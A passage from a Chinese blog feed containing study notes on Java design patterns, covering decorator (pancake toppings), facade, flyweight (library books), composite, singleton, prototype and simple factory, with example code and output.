class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addThings</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;正在添加鸡蛋&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;正在添加生菜&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getPancake</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;正在打包杂粮煎饼&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;请拿走杂粮煎饼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后写装饰饼的各种配料类：<br>写一个父类的原因除了复用代码以外，还有封装 Pancake，只暴漏指定的方法给装饰器使用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Things</span> <span class="keyword">implements</span> <span class="title">Pancake</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Pancake pancake;</span><br><span class="line"></span><br><span class="line">    Things(Pancake pancake) &#123;</span><br><span class="line">        <span class="keyword">this</span>.pancake=pancake;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">makePancake</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        pancake.makePancake();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addThings</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        pancake.addThings();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getPancake</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        pancake.getPancake();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Egg</span> <span class="keyword">extends</span> <span class="title">Things</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    Egg(Pancake pancake) &#123;</span><br><span class="line">        <span class="keyword">super</span>(pancake);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addThings</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.addThings();</span><br><span class="line">        System.out.println(<span class="string">&quot;正在添加鸡蛋&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Suasage</span> <span class="keyword">extends</span> <span class="title">Things</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    Suasage(Pancake pancake) &#123;</span><br><span class="line">        <span class="keyword">super</span>(pancake);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addThings</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.addThings();</span><br><span class="line">        System.out.println(<span class="string">&quot;正在添加香肠&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Spicy</span> <span class="keyword">extends</span> <span class="title">Things</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    Spicy(Pancake pancake) &#123;</span><br><span class="line">        <span class="keyword">super</span>(pancake);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addThings</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.addThings();</span><br><span class="line">        System.out.println(<span class="string">&quot;正在添加辣条&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后消费者就可以随便添加想要的配料了：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Consumer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 两个蛋，一包辣条，一根香肠的河南鸡蛋灌饼</span></span><br><span class="line">        Pancake Henan=<span class="keyword">new</span> HenanPancake();</span><br><span class="line">        Pancake eggHenan=<span class="keyword">new</span> Egg(Henan);</span><br><span class="line">        Pancake spicyEggHenan=<span class="keyword">new</span> Spicy(eggHenan);</span><br><span class="line">        Pancake suasageSpicyEggHenan=<span class="keyword">new</span> Suasage(spicyEggHenan);</span><br><span class="line">        suasageSpicyEggHenan.makePancake();</span><br><span class="line">        suasageSpicyEggHenan.addThings();</span><br><span class="line">        suasageSpicyEggHenan.getPancake();</span><br><span class="line"></span><br><span class="line">        System.out.println();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 两包辣条，一根肠的山东杂粮煎饼</span></span><br><span class="line">        Pancake Shandong=<span class="keyword">new</span> Spicy(<span class="keyword">new</span> Spicy(<span class="keyword">new</span> Suasage(<span class="keyword">new</span> ShanDongPancake())));</span><br><span class="line">        Shandong.makePancake();</span><br><span class="line">        Shandong.addThings();</span><br><span class="line">        Shandong.getPancake();</span><br><span class="line">    &#125;   </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">开始制作鸡蛋灌饼</span><br><span class="line">煎好白面饼了</span><br><span class="line">正在添加鸡蛋</span><br><span class="line">正在添加生菜</span><br><span class="line">正在添加鸡蛋</span><br><span class="line">正在添加辣条</span><br><span class="line">正在添加香肠</span><br><span class="line">正在打包鸡蛋灌饼</span><br><span class="line">请拿走鸡蛋灌饼</span><br><span class="line"></span><br><span class="line">开始制作杂粮煎饼</span><br><span class="line">煎好杂粮饼了</span><br><span class="line">正在添加鸡蛋</span><br><span class="line">正在添加生菜</span><br><span class="line">正在添加香肠</span><br><span class="line">正在添加辣条</span><br><span class="line">正在添加辣条</span><br><span class="line">正在打包杂粮煎饼</span><br><span class="line">请拿走杂粮煎饼</span><br></pre></td></tr></table></figure>
<h2 id="外观模式"><a href="#外观模式" class="headerlink" title="外观模式"></a>外观模式</h2><h3 id="概述-2"><a href="#概述-2" class="headerlink" title="概述"></a>概述</h3><p>外观模式其实就是将操作者和被操作对象之间，增加一个中间类，作为被操作对象的外观，来方便操作者调用。</p>
<p>生活中最明显的例子就是小爱捷径，对于拥有上百个智能家居的人来说，对于一个情景的控制就会很麻烦，比如一起床就需要控制拉开窗帘、打开灯、打开电饭煲热粥、打开热水器准备洗澡、略微提高空调的温度，查询今天的天气，打开语音播报的功能。</p>
<p>对于这种一个行为需要和大量类进行交互的情况，为了简化代码，可以将这些大量类的多个交互简化成一个交互。getUp() 一个方法帮我们完成这些复杂的类交互。对于调用者只需要调用这一个方法，就能完成所有的事情。</p>
<h3 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h3><p>优点：</p>
<ol>
<li>就是大大简化了代码，简化了可以统一封装的大量类交互，隐藏了细节。</li>
<li>降低了耦合度，符合最小认知原则。</li>
</ol>
<p>缺点：</p>
<ol>
<li>一旦新增加操作就需要增加外观类的方法，不符合开闭原则。</li>
<li>因为外观类的引入增加了项目的复杂度。</li>
</ol>
<h2 id="享元模式"><a href="#享元模式" class="headerlink" title="享元模式"></a>享元模式</h2><h3 id="概述-3"><a href="#概述-3" class="headerlink" title="概述"></a>概述</h3><p>享元模式其实就对象实例的缓存机制，对于一些可以重复利用的实例，我们可以将其加入到对应生成工厂的缓存里面，来提高重复利用程度。</p>
<p>对于比较简单的一些享元，比如 String，Byte 这些所有内容都不会变的，那么就直接去缓存查找，是否有已经存在的实例，如果有，那么直接返回，如果没有，创建一个新的实例并添加到缓存中。比如 String 对于一个字符串的不同引用来说，都会指向一个内存地址，这就是因为缓存返回的都是同一个一样的对象。而 Byte 也同样是，使用静态方法获取实例的时候，内部就使用了缓存，来共享相同的已存在实例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Byte <span class="title">valueOf</span><span class="params">(<span class="keyword">byte</span> b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">int</span> offset = <span class="number">128</span>;</span><br><span class="line">        <span class="keyword">return</span> ByteCache.cache[(<span class="keyword">int</span>)b + offset];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>对于一些比较复杂的享元，那就是一部分可以共享，而有一些实际操作是不一样的。比如线程池里面的线程实例是可以共享的，但是运行时候需要的 Runnable 实例是非共享的（自定义的运行内容），JDBC 连接池里面和数据库保持连接的 Connection 是可以共享的（数据库地址，账号，密码不变），而执行的 Statement 是不可以共享的。</p>
<p>所以你可以发现，写 Java 的程序员就很好的意识到了这些，特意的将可以资源消耗大，但是需要频繁使用的实例拆分开来，拆分为可共享部分和不可共享部分。可共享部分利用线程池、连接池来进行重复利用的资源优化，不可共享部分则（Runnable，Statement）通过外部构建并传入，或者传入参数内部构建，来组合成完整的功能。</p>
<h3 id="代码实现-3"><a href="#代码实现-3" class="headerlink" title="代码实现"></a>代码实现</h3><p>我们来写一个简单的享元模式的图书馆吧，而图书馆里面的图书就是可以共享的资源：</p>
<p>图书实例（其实不嫌麻烦可以写成接口，然后搞不同种类的书，如杂志、小说、漫画等等，不过这样的话就需要为 Book 单独建立一个生成工厂了）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Book</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    Book(String name) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;购买图书：&quot;</span>+name);</span><br><span class="line">        <span class="keyword">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Look</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;正在阅读：&quot;</span>+name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>用来管理图书实例的图书馆：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Library</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String,List&lt;Book&gt;&gt; books=<span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Book <span class="title">getBook</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        Book book;</span><br><span class="line">        <span class="keyword">if</span>(books.containsKey(name)) &#123;</span><br><span class="line">            List&lt;Book&gt; Lbook=books.get(name);</span><br><span class="line">            <span class="keyword">if</span>(Lbook.isEmpty()) &#123;</span><br><span class="line">                book=<span class="keyword">new</span> Book(name);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                book=Lbook.get(<span class="number">0</span>);</span><br><span class="line">                Lbook.remove(book);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            books.put(name,<span class="keyword">new</span> ArrayList&lt;&gt;());</span><br><span class="line">            book=<span class="keyword">new</span> Book(name);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;借阅图书：&quot;</span>+name);</span><br><span class="line">        <span class="keyword">return</span> book;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">backBook</span><span class="params">(Book book)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;归还图书：&quot;</span>+book.getName());</span><br><span class="line">        books.get(book.getName()).add(book);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>读者开始借书读书：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Reader</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Library lib=<span class="keyword">new</span> Library();</span><br><span class="line"></span><br><span class="line">        Book book1=lib.getBook(<span class="string">&quot;CSAPP&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;图书编号：&quot;</span>+book1);</span><br><span class="line">        book1.Look();</span><br><span class="line">        lib.backBook(book1);</span><br><span class="line">        </span><br><span class="line">        System.out.println();</span><br><span class="line"></span><br><span class="line">        Book book2=lib.getBook(<span class="string">&quot;CSAPP&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;图书编号：&quot;</span>+book2);</span><br><span class="line">        book2.Look();</span><br><span class="line">        lib.backBook(book2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后借阅结果，发现两次借阅获得的书是同一本（同一个内存地址中的实例）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">购买图书：CSAPP</span><br><span class="line">借阅图书：CSAPP</span><br><span class="line">图书编号：Java.VScodeProject.Book@1fe20588</span><br><span class="line">正在阅读：CSAPP</span><br><span class="line">归还图书：CSAPP</span><br><span class="line"></span><br><span class="line">借阅图书：CSAPP</span><br><span class="line">图书编号：Java.VScodeProject.Book@1fe20588</span><br><span class="line">正在阅读：CSAPP</span><br><span class="line">归还图书：CSAPP</span><br></pre></td></tr></table></figure>
<h2 id="组合模式"><a href="#组合模式" class="headerlink" title="组合模式"></a>组合模式</h2><h3 id="概述-4"><a href="#概述-4" class="headerlink" title="概述"></a>概述</h3><p>组合模式（又叫整体-部分模式）：将对象组合成树形结构以表示“部分-整体”的层次结构，使得用户对单个对象和组合对象的使用具有一致性。</p>
<p>举个例子，比如文件夹和文件的关系，文件夹就是由子文件夹和文件构成的，文件夹和文件组合在一起变成整体，文件夹和文件都可以作为部分。</p>
<p>而组合模式的核心就是将这些相似的东西：文件和文件夹当作一个东西处理，它们都是 File 类的实例，里面同时包含了各自的方法，使用的时候需要鉴别方法是否对当前对象可以使用。</p>
<p>比如一个文件的 File 类，使用 listFile() 返回的就是 null 空引用，所以缺点就是不太安全，但是优点就是方便操作，管他是文件还是文件夹，都是 File 的实例。</p>
<h3 id="代码实现-4"><a href="#代码实现-4" class="headerlink" title="代码实现"></a>代码实现</h3><p>定义统一的一个接口，接口包含所有整体和部分的方法。然后整体类和部分类分别实现接口的代码，要求整体类的构造方法可以或者 add() 方法可以传入类型为接口类型（这样整体类对象和部分类对象都可以作为它的一部分）</p>
<p>比如文件夹系统，分为文件夹类（整体类）和文件类（部分类），一起实现同一个接口 File，这个接口定义里文件操作和文件夹操作的所有方法。而构造文件夹类的实例的时候，可以传入文件夹实例和文件实例，作为当前文件夹的内部部分。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">具体代码就不写了，参考 Java 里面的 File 类就行了。</span><br></pre></td></tr></table></figure>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><blockquote>
<p>哇哇哇，结构型模式笔记终于写完了，写到了后面连思维导图都不想搞了，主要是拖得时间太长了，里面内容也很多，而且思维导图对于这种类型的知识点来说没啥用。但是想想看自己学的时间还是太长了，所以要不停的提高学习效率啊！不然后端开发的知识点这么多，这样学下去怕不是得学到毕业……</p>
</blockquote>
<p>呼~ 长呼一口气，准备开始行为型模式的学习吧，加油啊！</p>
]]></content>
      <categories>
        <category>开发知识</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
        <tag>结构型</tag>
      </tags>
  </entry>
  <entry>
    <title>创建型模式笔记</title>
    <url>/2021/03/09/d965ea17830f/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><blockquote>
<p>创建型模式的核心就是通过将创建对象和使用对象分离开来，去关注于怎样去创建一个对象。</p>
</blockquote>
<h2 id="单列模式"><a href="#单列模式" class="headerlink" title="单列模式"></a>单列模式</h2><h3 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h3><iframe src="https://www.xmind.net/embed/8cxt5R" width="800px" height="540px" frameborder="0" scrolling="no"></iframe>

<h3 id="懒汉式单列实现代码"><a href="#懒汉式单列实现代码" class="headerlink" title="懒汉式单列实现代码"></a>懒汉式单列实现代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LazyXorex</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> LazyXorex instance=<span class="keyword">null</span>;</span><br><span class="line">    <span class="comment">// instance 一定要通过 volatile 即使写入内存中！</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">LazyXorex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 方法也要被锁住，方式多创建了实例</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> LazyXorex <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(instance==<span class="keyword">null</span>) &#123;</span><br><span class="line">            instance=<span class="keyword">new</span> LazyXorex();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="饿汉式单列实现代码"><a href="#饿汉式单列实现代码" class="headerlink" title="饿汉式单列实现代码"></a>饿汉式单列实现代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HungryXorex</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> HungryXorex instance=<span class="keyword">new</span> HungryXorex();</span><br><span class="line">    <span class="comment">// 在类被加载到内存的时候 instance 就拥有了实例。</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">HungryXorex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> HungryXorex <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="原型模式"><a href="#原型模式" class="headerlink" title="原型模式"></a>原型模式</h2><h3 id="思维导图-1"><a href="#思维导图-1" class="headerlink" title="思维导图"></a>思维导图</h3><iframe src="https://www.xmind.net/embed/TkqvpR" width="800px" height="540px" frameborder="0" scrolling="no"></iframe>

<h3 id="实现可克隆类"><a href="#实现可克隆类" class="headerlink" title="实现可克隆类"></a>实现可克隆类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tempest</span> <span class="keyword">implements</span> <span class="title">Cloneable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String Xorex=<span class="string">&quot;Xorex&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span> </span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Tempest <span class="title">clone</span><span class="params">()</span> <span class="keyword">throws</span> CloneNotSupportedException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (Tempest)<span class="keyword">super</span>.clone(); <span class="comment">// 调用父类 Object 的 clone() 方法。</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="简单工厂"><a href="#简单工厂" class="headerlink" title="简单工厂"></a>简单工厂</h2><h3 id="思维导图-2"><a href="#思维导图-2" class="headerlink" title="思维导图"></a>思维导图</h3><iframe src="https://www.xmind.net/embed/krk9YR" width="800px" height="540px" frameborder="0" scrolling="no"></iframe>

<h3 id="实现内部封装的简单工厂"><a href="#实现内部封装的简单工厂" class="headerlink" title="实现内部封装的简单工厂"></a>实现内部封装的简单工厂</h3><blockquote>
<p>下面代码例子是使用简单工厂的方式获取不同的 Waifu 产品。步骤是通过相同的工厂 Factory 的静态方法 makeWaifu 来获取产品，waifu 产品的具体创建交给工厂的 makeWaifu 来决定。至于返回的是哪一个具体的 Waifu，我们并不需要关心，只需要用统一接口 Waifu 来接收并操作即可。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SimpleWaifuFactory.Waifu Yukino=SimpleWaifuFactory.Factory.makeWaifu(SimpleWaifuFactory.Yukinoshita_Yukino);</span><br><span class="line">        SimpleWaifuFactory.Waifu Asuna=SimpleWaifuFactory.Factory.makeWaifu(SimpleWaifuFactory.Yuuki_Asuna);</span><br><span class="line">        Yukino.selfIntroduction();</span><br><span class="line">        Asuna.selfIntroduction();</span><br><span class="line">    &#125; <span class="comment">// 外部调用简单工厂来获取对应的实例，然后调用里面的方法。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一个单独的 public 工厂</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SimpleWaifuFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> Yukinoshita_Yukino = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> Yuuki_Asuna = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 定义工厂接收的参数标准</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Waifu</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">selfIntroduction</span><span class="params">()</span></span>;</span><br><span class="line">    &#125; <span class="comment">// 定义本工厂生产的产品的统一模板，让外部持有接口使用实例。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Yukino</span> <span class="keyword">implements</span> <span class="title">Waifu</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">selfIntroduction</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Ya~hello,There is Yukinoshita Yukino!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="comment">// 产品 Yukino 实例定义类</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Asuna</span> <span class="keyword">implements</span> <span class="title">Waifu</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">selfIntroduction</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hi,I am Yuuki Asnua!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="comment">// 产品 Asuna 实例定义类</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Factory</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Waifu <span class="title">makeWaifu</span><span class="params">(<span class="keyword">int</span> waifuID)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">switch</span> (waifuID) &#123;</span><br><span class="line">                <span class="keyword">case</span> Yukinoshita_Yukino:</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> Yukino();</span><br><span class="line">                <span class="keyword">case</span> Yuuki_Asuna:</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> Asuna();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="comment">// 生成实例的工厂</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="实现外部散开工厂"><a href="#实现外部散开工厂" class="headerlink" title="实现外部散开工厂"></a>实现外部散开工厂</h3><p>这里代码需要注意，所有的工厂相关类都需要写在一个包里面，保证非 public 类型（不对外开放的）产品类只能被包内的工厂访问。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SimpleFactory</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Waifu Yukino=SimpleWaifuFactory.makeWaifu(SimpleWaifuFactory.Yukinoshita_Yukino);</span><br><span class="line">        Waifu Asuna=SimpleWaifuFactory.makeWaifu(SimpleWaifuFactory.Yuuki_Asuna);</span><br><span class="line">        Yukino.selfIntroduction();</span><br><span class="line">        Asuna.selfIntroduction();</span><br><span class="line">    &#125; <span class="comment">// 外部调用简单工厂来获取对应的实例，然后调用里面的方法。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一个单独的 public 工厂</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SimpleWaifuFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> Yukinoshita_Yukino = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> Yuuki_Asuna = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 定义工厂接收的参数标</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Waifu <span class="title">makeWaifu</span><span class="params">(<span class="keyword">int</span> waifuID)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (waifuID) &#123;</span><br><span class="line">            <span class="keyword">case</span> Yukinoshita_Yukino:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> Yukino();</span><br><span class="line">            <span class="keyword">case</span> Yuuki_Asuna:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> Asuna();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="comment">// 生成实例的工厂</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Waifu</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">selfIntroduction</span><span class="params">()</span></span>;</span><br><span class="line">&#125; <span class="comment">// 定义本工厂生产的产品的统一模板，让外部持有接口使用实例。</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yukino</span> <span class="keyword">implements</span> <span class="title">Waifu</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">selfIntroduction</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Ya~hello,There is Yukinoshita Yukino!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="comment">// 产品 Yukino 实例定义类</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Asuna</span> <span class="keyword">implements</span> <span class="title">Waifu</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">selfIntroduction</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hi,I am Yuuki Asnua!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="comment">// 产品 Asuna 实例定义类</span></span><br></pre></td></tr></table></figure>

